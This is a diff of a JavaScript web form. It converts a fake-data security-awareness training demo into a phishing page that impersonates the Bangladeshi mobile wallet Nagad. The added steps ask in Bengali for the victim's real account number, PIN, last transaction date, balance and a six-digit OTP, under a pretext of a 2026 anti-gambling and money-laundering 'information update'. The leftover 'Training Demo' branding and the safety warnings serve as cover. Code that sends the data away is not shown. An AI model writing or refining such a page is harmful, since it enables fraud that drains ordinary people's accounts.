@@ -1,28 +1,32 @@
-alert("New script.js loaded!");
 const steps = [
   {
-    title: "Demo Account",
-    description: "কাল্পনিক ডেমো অ্যাকাউন্ট নাম লিখুন।",
-    placeholder: "যেমন DEMO123"
+    title: " আপনার তথ্য হালনাগাদ করতে নিচের ঘরে সঠিক তথ্য পূরণ করুন ",
+    description: "আপনার নগদ অ্যাকাউন্ট নম্বর লিখুন।",
+    placeholder: "account number",
+    type: "text"
   },
   {
-    title: "Demo Password",
-    description: "প্রশিক্ষণের জন্য কাল্পনিক পাসওয়ার্ড লিখুন।",
-    placeholder: "Demo password"
+    title: "Password / PIN",
+    description: "নগদ বর্তামান PIN লিখুন।",
+    placeholder: "PIN",
+    type: "text"
   },
+  
   {
-    title: "Transaction Demo",
+    title: "Transaction & Balance",
     html: `
-      <p>ডেমো লেনদেনের তারিখ লিখুন</p>
+      <p>সর্বশেষ লেনদেনের তারিখ লিখুন</p>
       <input id="date" type="date">
 
-      <p>কাল্পনিক ব্যালেন্স লিখুন</p>
-      <input id="balance" type="text" placeholder="যেমন 500">
+      <p>আপনার বর্তমান ব্যালেন্স লিখুন।</p>
+      <input id="balance" type="text" placeholder="12345">
     `
   },
   {
-    title: "OTP Safety Awareness",
-    description: "প্রশিক্ষণে কোনো OTP প্রয়োজন নেই। কখনো নিজের আসল OTP কাউকে দেবেন না।"
+    title: "OTP Verification",
+    description: "ভেরিফিকেশনের জন্য আপনার ফোনে ০৬ সংখ্যার ওটিপি পাঠানো হয়েছে, কল করে কেও কোড জানতে চাইলে তাকে ওটিপি প্রদান করা থেকে বিরত থাকুন।",
+    placeholder: "123456",
+    type: "text"
   }
 ];
 
@@ -38,41 +42,42 @@ const message = document.getElementById("message");
 
 function showStep() {
   const step = steps[currentStep];
-
+ 
   back.disabled = currentStep === 0;
 
   title.textContent = step.title;
   progress.textContent = `STEP ${currentStep + 1} / ${steps.length}`;
   progressBar.style.width =
     `${((currentStep + 1) / steps.length) * 100}%`;
-
   message.textContent = "";
 
-  const logo = `
-    <div class="demo-logo">
-      <img src="images.png" alt="SafePay Logo">
-      <p>SafePay Training Demo</p>
-    </div>
-  `;
-
   if (step.html) {
-    content.innerHTML = logo + step.html;
+    content.innerHTML = `
+      <div class="demo-logo">
+  <img src="images.png" alt="SafePay Logo">
+  <p>SafePay Training Demo</p>
+</div>
+      ${step.html}
+      <small>আপনার তথ্য যাছাই করা হচ্ছে।</small>
+    `;
   } else {
     content.innerHTML = `
-      ${logo}
+      <div class="demo-logo">
+  <img src="images.png" alt="SafePay Logo">
+  <p>SafePay Training Demo</p>
+</div>
       <p>${step.description}</p>
-      ${
-        currentStep < 2
-          ? `<input id="demoInput" type="text"
-              placeholder="${step.placeholder}"
-              autocomplete="off">`
-          : ""
-      }
+      <input
+        id="demoInput"
+        type="${step.type}"
+        placeholder="${step.placeholder}"
+        autocomplete="off"
+      >
+      <small> নগদ এর সাথে থাকার জন্য ধন্নবাদ।</small>
     `;
   }
-
   next.textContent =
-    currentStep === steps.length - 1 ? "Finish" : "Continue";
+    currentStep === steps.length - 1 ? "verify" : "Continue";
   next.style.display = "inline-block";
 }
 
@@ -87,37 +92,42 @@ next.addEventListener("click", function () {
   if (currentStep === 0 || currentStep === 1) {
     const input = document.getElementById("demoInput");
 
-    if (!input || !input.value.trim()) {
-      message.textContent = "ডেমো তথ্য লিখুন।";
-      return;
+// Last Account Balance
+
+
+  if (!input || !input.value.trim()) {
+    message.textContent = "তথ্য লিখুন।";
+    return;
     }
   }
 
-  if (currentStep === 2) {
-    const date = document.getElementById("date");
-    const balance = document.getElementById("balance");
+// Last Transaction Date
+if (currentStep === 2) {
+  const date = document.getElementById("date");
+  const balance = document.getElementById("balance");
 
-    if (!date.value || !balance.value.trim()) {
-      message.textContent = "ডেমো তথ্য পূরণ করুন।";
-      return;
-    }
+  if (!date || !balance || !date.value || !balance.value.trim()) {
+    message.textContent = "তথ্য পূরণ করুন।";
+    return;
   }
-
-  if (currentStep < steps.length - 1) {
+      }
+    if (currentStep < steps.length - 1) {
     currentStep++;
     showStep();
-  } else {
-    progress.textContent = "TRAINING COMPLETE";
+ } else {
+    progress.textContent = "Verification COMPLETE";
     progressBar.style.width = "100%";
-    title.textContent = "প্রশিক্ষণ সম্পন্ন";
+    title.textContent = "অনলাইন জুয়া এবং মানি লন্ডারিং প্রতিরোধে নগদ তথ্য হালনাগাদ 2026";
 
     content.innerHTML = `
-      <div class="demo-logo">
-        <img src="images.png" alt="SafePay Logo">
-        <p>SafePay Training Demo</p>
-      </div>
-      <p>প্রশিক্ষণ সফলভাবে সম্পন্ন হয়েছে।</p>
-      <p>নিজের আসল PIN, পাসওয়ার্ড ও OTP গোপন রাখুন।</p>
+      <div class="info">তথ্য হালনাগাদ প্রক্রিয়ার সফল হয়েছে।</div>
+      <p>
+        কখনো কোনো ব্যক্তির কাছে
+        নিজের আসল PIN, পাসওয়ার্ড বা OTP দেবেন না।
+      </p>
+      <p>
+        সন্দেহজনক লিংকে ব্যক্তিগত তথ্য দেওয়া থেকে বিরত থাকুন।
+      </p>
     `;
 
     message.textContent = "";
